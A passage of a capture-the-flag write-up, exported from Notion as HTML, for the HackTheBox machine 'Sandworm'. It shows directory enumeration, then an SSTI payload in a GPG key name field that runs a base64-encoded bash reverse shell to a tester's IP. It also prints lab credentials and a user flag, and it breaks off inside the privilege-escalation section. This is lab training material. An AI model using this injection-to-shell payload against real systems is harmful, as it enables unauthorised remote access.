@@ -1,0 +1,1072 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Sandworm</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="04e8fc97-b994-4222-836d-0d7158571f40" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">🐛</span></div><h1 class="page-title">Sandworm</h1><p class="page-description"></p></header><div class="page-body"><p id="9cbbc4fd-c1e7-44ae-85f6-ba31ef913f6f" class="">The presented site allows you to encrypt/decrypt text with PGP signatures, and has its own to check the usage of it</p><p id="e582eaed-148d-4407-8a4d-1ed9f6277501" class="">
+</p><p id="bc225c1f-078b-4216-8c02-0ad498d3e97e" class=""><mark class="highlight-pink">SO this box shows us an SSTI in the NAME field for the pubkey that we generate.</mark></p><p id="7617c51f-d831-47d4-b7f4-369a19d80af8" class="">
+</p><p id="0cefbc48-e09f-4bd0-9520-d0d04daf4215" class=""><mark class="highlight-pink"><strong>SSTI in GPG name field of the verify message to get foothold</strong></mark></p><p id="5eeaf73f-a430-4b66-94db-69e60352a1c1" class=""><br/><br/></p><p id="54e697a6-bc6e-4513-bd06-b7d03bb539a9" class="">Gobuster</p><p id="26c48103-201d-4f7d-a3dc-cf06e766fec5" class=""><code>gobuster dir -u https://ssa.htb -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -k</code></p><p id="6903e9eb-6a54-4f76-bf8c-2b1001dd9afa" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="391501cc-2ff7-45bf-a963-22a2e063d3fa" class="code"><code class="language-PowerShell">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Sandworm]
+└─$ gobuster dir -u https://ssa.htb -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -k 
+
+===============================================================
+Gobuster v3.2.0-dev
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://ssa.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.2.0-dev
+[+] Timeout:                 10s
+===============================================================
+2023/06/23 09:56:29 Starting gobuster in directory enumeration mode
+===============================================================
+/contact              (Status: 200) [Size: 3543]
+/about                (Status: 200) [Size: 5584]
+/login                (Status: 200) [Size: 4392]
+/view                 (Status: 302) [Size: 225] [--&gt; /login?next=%2Fview]
+/admin                (Status: 302) [Size: 227] [--&gt; /login?next=%2Fadmin]
+/guide                (Status: 200) [Size: 9043]
+/pgp                  (Status: 200) [Size: 3187]
+/logout               (Status: 302) [Size: 229] [--&gt; /login?next=%2Flogout]
+/process              (Status: 405) [Size: 153]</code></pre><p id="8b15d123-48af-448d-969c-4372f5dc7e8e" class="">
+</p><p id="32117ccc-e57b-4f35-b103-650ab7e1980f" class="">Generate a key</p><p id="d0782b28-d016-4180-8065-971750a477c2" class=""><code>gpg --quick-gen-key yougotgot</code></p><p id="a2f206e2-233a-4370-8094-21506ec7e179" class="">
+</p><p id="7725ce16-28b1-4373-b12d-bc1c77795e19" class="">Export the key</p><p id="4d8bb712-076b-43b0-8aca-fcb5d9b6869c" class=""><code>gpg --armor --export yougotgot | sponge pubkey.asc</code></p><p id="91007294-3368-4807-92a8-7cf32b4e994c" class="">
+</p><p id="06c3fc27-865c-42f7-8110-a2370676c6e9" class="">Edit the key and add a reverse shell</p><p id="12e91012-f53f-4690-8c18-10a6ac64ff39" class=""><code>gpg --edit-key</code></p><p id="249990f2-409f-4663-bc11-9c3691997046" class="">
+</p><p id="6b7bfd8c-e904-416e-881c-acf7a4d017a7" class="">Inside of the name add the below script base64 encoded</p><p id="b4770c01-1bc2-451e-b83f-0e8e58cbd873" class="">
+</p><p id="40c66d8e-472a-45bd-b5b6-0880ef7f8f38" class="">revshell</p><p id="b06cef5c-d6e8-42fa-94a9-3393315c815e" class="">
+</p><p id="109df495-12d8-4039-a909-c131de4de325" class=""><code>{{ self.</code><code><strong>init</strong></code><code>.</code><code><strong>globals</strong></code><code>.</code><code><strong>builtins</strong></code><code>.</code><code><strong>import</strong></code><code>(&#x27;os&#x27;).popen(&#x27;echo &quot;c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjYvOTk5OSAwPiYx&quot; | base64 -d | bash&#x27;).read() }}</code></p><figure id="6ee1690b-740d-4751-8196-280dbc508512" class="image"><a href="Sandworm%2004e8fc97b9944222836d0d7158571f40/Untitled.png"><img style="width:1510px" src="Sandworm%2004e8fc97b9944222836d0d7158571f40/Untitled.png"/></a></figure><p id="6b900c78-6a38-4fd3-9bb5-a2dcd4875674" class="">
+</p><p id="5b8b1e44-adfe-441e-a98c-5a17ca76f266" class="">We are now on the box as <code>atlas </code>user.</p><p id="bc49f792-7517-4a14-a37e-bc099a526a01" class="">
+</p><p id="dc85e0c2-fcf9-48a0-bcae-4e520dd8ed3d" class="">Looking for files and directories we discover a .config directory where we find the <code>admin.json </code>file</p><p id="7c093776-fb07-41d6-8c56-7596b9b1db71" class="">where we find credentials for the <code>silentobserver</code> user</p><p id="529d2031-2cdd-4b64-a446-23444c78a216" class="">
+</p><p id="0854c28c-be98-489e-9686-ae307a6368fa" class="">Inside of this directory found admin.json file</p><p id="ea4d2e7d-2bb0-405c-b942-0891adfec8ac" class=""><code>/home/atlas/.config/httpie/sessions/localhost_5000/admin.json</code></p><p id="dc1085fe-5382-45c6-bc13-de0402abfb6b" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="469916af-8b0c-4cc1-bc69-592dc86fb6b0" class="code"><code class="language-PowerShell">cat admin.json
+{
+    &quot;__meta__&quot;: {
+        &quot;about&quot;: &quot;HTTPie session file&quot;,
+        &quot;help&quot;: &quot;https://httpie.io/docs#sessions&quot;,
+        &quot;httpie&quot;: &quot;2.6.0&quot;
+    },
+    &quot;auth&quot;: {
+        &quot;password&quot;: &quot;quietLiketheWind22&quot;,
+        &quot;type&quot;: null,
+        &quot;username&quot;: &quot;silentobserver&quot;
+    },
+    &quot;cookies&quot;: {
+        &quot;session&quot;: {
+            &quot;expires&quot;: null,
+            &quot;path&quot;: &quot;/&quot;,
+            &quot;secure&quot;: false,
+            &quot;value&quot;: &quot;eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA&quot;
+        }
+    },
+    &quot;headers&quot;: {
+        &quot;Accept&quot;: &quot;application/json, */*;q=0.5&quot;
+    }
+}</code></pre><p id="e816a84f-0bcf-48e9-9b56-0087bdf7a43e" class="">
+</p><p id="81cb526e-85c1-47e3-b254-b970e7bb2f9b" class="">SSH as silentobserver with the found password: quietLiketheWind22</p><p id="50d6978b-6e70-4f40-a5e5-787725afaa98" class="">
+</p><p id="7305ec33-a0bb-40fe-b437-e35d42388950" class="">We get the user flag</p><p id="ad037aef-f79a-499b-ae2a-8cb8be741c10" class=""><mark class="highlight-teal">user.txt: 3364e27e0147972e31f3a603863a9df0</mark></p><p id="92ffbf3e-7251-42f4-942c-21d8fe99a3f5" class="">
+</p><hr id="ca1d321d-c871-4ad9-8209-5f0db28bba81"/><hr id="04f1f3f0-b45d-4881-842f-d976d18830d8"/><hr id="6c47bfdb-ac02-4023-8dea-e408be87beb0"/><hr id="e8662400-6f82-4403-bb0c-2d88c684671c"/><p id="ea5f8ef0-5702-4ef5-9884-3b6aee05823b" class="">
+</p><p id="795e5d3f-5685-4048-b73b-6b02373ec822" class="">Privilege escalation</p><p id="1a927e80-509f-41fa-9bff-895c8034059f" class="">Root has an unintended described in above link. </p><p id="cd4a6310-5495-49ac-bc93-4736895fdc2a" class="">
+</p><p id="c9cea2d5-05a5-40da-bb82-a2d31c8edece" class="">
+</p><p id="1e42af50-eb23-4ede-9b73-41542f343d13" class="">From pspy we get the following interesting process:</p><p id="9720d2f9-34b8-4e78-94dc-38ca647c6e85" class=""><code>/bin/sh -c cd /opt/tipnet &amp;&amp; /bin/echo &quot;e&quot; | /bin/sudo -u atlas /usr/bin/cargo run --offline</code></p><figure id="034f4cab-de36-44c7-b584-505912871a4f" class="image"><a href="Sandworm%2004e8fc97b9944222836d0d7158571f40/Untitled%201.png"><img style="width:1500px" src="Sandworm%2004e8fc97b9944222836d0d7158571f40/Untitled%201.png"/></a></figure><p id="5c1bd8fc-7218-4fbf-9bc8-8d1b8e396512" class="">
+</p><p id="47d66cbb-33dc-4d15-b087-ea6bb47e323d" class="">Lets move there and see what is it about</p><p id="50f95561-7194-4d1c-80d9-f6de2f4507b2" class=""><code>/opt/tipnet/src/main.rs</code></p><p id="02057a51-ab7c-4785-9f94-496f42f241c2" class="">
+</p><p id="a3db10da-bc8c-4e44-adb6-3350b21c4df7" class="">There is the <a href="http://main.rs">main.rs</a> script </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bdd90c32-cacb-4742-8187-c2e5ecccadd4" class="code"><code class="language-PowerShell">silentobserver@sandworm:/opt/tipnet/src$ ls -laht main.rs 
+-rwxr-xr-- 1 root atlas 5.7K May  4 16:55 main.rs</code></pre><p id="4395c4ef-7a9e-4b3e-a800-f8c2cd10f523" class="">
+</p><p id="e05fd23e-8170-4c14-a1a9-39089244939d" class="">Below is the output of the script and what it does</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="03516cff-f425-4c14-9e5f-2bc4f53b9195" class="code"><code class="language-Rust">silentobserver@sandworm:/opt/tipnet/src$ cat main.rs 
+extern crate logger;
+use sha2::{Digest, Sha256};
+use chrono::prelude::*;
+use mysql::*;
+use mysql::prelude::*;
+use std::fs;
+use std::process::Command;
+use std::io;
+
+// We don&#x27;t spy on you... much.
+
+struct Entry {
+    timestamp: String,
+    target: String,
+    source: String,
+    data: String,
+}
+
+fn main() {
+    println!(&quot;                                                     
+             ,,                                      
+MMP\&quot;\&quot;MM\&quot;\&quot;YMM db          `7MN.   `7MF&#x27;         mm    
+P&#x27;   MM   `7               MMN.    M           MM    
